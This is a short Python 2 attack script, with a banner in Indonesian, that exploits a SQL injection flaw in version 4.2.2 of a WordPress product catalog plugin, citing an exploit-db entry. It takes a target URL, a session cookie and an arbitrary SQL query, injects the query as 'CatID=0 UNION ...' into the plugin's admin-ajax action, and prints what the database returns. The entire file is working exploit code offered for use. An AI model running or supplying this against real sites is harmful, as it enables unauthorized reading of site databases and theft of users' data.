#! /usr/bin/python
import sys, getopt, requests
 
print "###########################################################################################################"
print "# Ini adalah tools untuk melakukan exploitasi kelemahan                                                   #"
print "# wordpress plugin product catalog 4.2.2                                                                  #"
print "# Reference  https://www.exploit-db.com/exploits/42263                                                    #"
print "# by tomplixsee@yahoo.co.id                                                                               #"
print "#                                                                                                         #"
print "#                                                                                                         #"
print "# how to use                                                                                              #"
print "# .py -u <url> -c <cookie> -q <query>                                                                     #"
print "# example                         ...                                                                     #"
print "# .py -u http://mywp/wp-admin/admin-ajax.php?action=get_upcp_subcategories -c \"mycookie\" -q \"myquery\"     #"
print "###########################################################################################################"

def isset(variable):
	return variable in locals() or variable in globals()
	
def main(argv):
	global url, cookie, query

	
	try:
		opts, args = getopt.getopt(argv,"u:c:q:",["url=","cookie=","query="])
	except getopt.GetoptError:
		sys.exit(2)
		
	if len(opts)<1: sys.exit()
	for opt, arg in opts:
		if opt in ("-u", "--url"):
			url = arg
		elif opt in ("-c", "--cookie"):
			cookie = arg
		elif opt in ("-q", "--query"):
			query = arg
	
	if isset("cookie")==False or isset("url")==False: 
		print "error : parameters url and cookie is required"
		sys.exit()
	
if __name__ == "__main__":
   main(sys.argv[1:])
   
def send():
	global url, cookie, query

	
	if isset("query")==False: query = "SELECT CONCAT(CHAR(115),CHAR(104),CHAR(101),CHAR(32),CHAR(105),CHAR(115)),CONCAT(CHAR(118),CHAR(117),CHAR(108),CHAR(110),CHAR(101),CHAR(114),CHAR(97),CHAR(98),CHAR(108),CHAR(101),CHAR(33),CHAR(33))"
	data = {'CatID':'0 UNION '+query}
	headers = {
		'Content-type': 'application/x-www-form-urlencoded',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'Cookie': cookie
	}
	r = requests.post(url, data=data, headers=headers)
	print ""
	print "query executed : ..... 0 UNION "+query
	print ""
	print "result : >>>>>>> "+r.content

send()

